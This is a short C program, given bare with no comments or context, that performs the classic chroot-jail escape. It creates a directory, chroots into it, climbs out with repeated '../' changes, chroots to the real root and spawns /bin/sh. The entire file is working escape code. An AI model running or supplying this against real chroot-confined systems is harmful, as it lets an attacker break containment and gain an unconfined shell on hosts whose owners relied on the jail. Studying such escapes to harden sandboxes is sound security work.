#include <unistd.h>
#include <sys/stat.h>

int main(void)
{
	mkdir("x", 0700);
	chroot("x");
	chdir("../../../../../../../../../../..");
	chroot(".");
	execl("/bin/sh", "sh", 0);
	return 1;
}
